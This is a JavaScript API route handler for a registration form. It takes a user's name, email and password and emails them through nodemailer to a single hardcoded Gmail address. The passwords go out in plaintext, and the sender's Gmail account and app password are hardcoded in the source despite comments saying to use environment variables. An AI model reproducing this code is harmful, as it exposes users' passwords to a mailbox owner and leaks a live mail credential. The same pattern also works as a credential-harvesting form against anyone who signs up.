
import nodemailer from "nodemailer";

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ message: "Method Not Allowed" });
    }

    const { name, email, password, confirm_password } = req.body;

    if (!name || !email || !password || !confirm_password) {
        return res.status(400).json({ message: "Missing required fields" });
    }

    try {
        // Nodemailer Transporter Setup
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: "ayeshakhadam2@gmail.com", // Use environment variables
                pass: "qpoh xhdo ckyv tzbl",
            },
        });

        // Email Content
        const mailOptions = {
            from: "ayeshakhadam2@gmail.com",
            to: "ayeshakhadam2@gmail.com", // Set receiver email in .env.local
            subject: "New User Registration",
            html: `
                <h2>New User Registration</h2>
                <p><strong>Name:</strong> ${name}</p>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Password:</strong> ${password}</p>
                <p><strong>Confirm Password:</strong> ${confirm_password}</p>
            `,
        };

        // Send Email
        await transporter.sendMail(mailOptions);

        return res.status(200).json({ message: "Email sent successfully!" });
    } catch (error) {
        console.error("Error sending email:", error);
        return res.status(500).json({ message: "Failed to send email" });
    }
}
